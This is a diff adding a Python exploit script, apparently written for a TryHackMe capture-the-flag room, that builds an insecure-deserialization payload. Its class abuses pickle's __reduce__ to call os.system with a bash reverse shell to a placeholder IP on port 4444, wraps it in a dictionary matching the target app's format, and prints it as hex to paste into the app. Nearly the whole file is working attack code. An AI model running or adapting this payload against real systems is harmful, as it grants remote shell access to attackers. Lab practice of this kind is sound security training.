@@ -1,0 +1,27 @@
+# tryhackme room: https://tryhackme.com/room/voyage
+
+import pickle
+import binascii
+import os
+
+# Minimalist class for RCE
+class RCE:
+    def __reduce__(self):
+        # Reliable one-liner bash reverse shell
+        # REPLACE YOUR_IP with your actual VPN IP
+        cmd = "bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
+        return (os.system, (cmd,))
+
+# The payload MUST be inside a dictionary to match the app logic
+# This prevents the application from crashing after deserialization
+exploit_data = {
+    "user": RCE(),
+    "revenue": "1337"
+}
+
+# Serialize with Protocol 4 (default for Python 3) and convert to hex
+payload = binascii.hexlify(pickle.dumps(exploit_data, protocol=4)).decode()
+
+print("\n--- COPY THIS HEX ---")
+print(payload)
+print("---------------------\n")
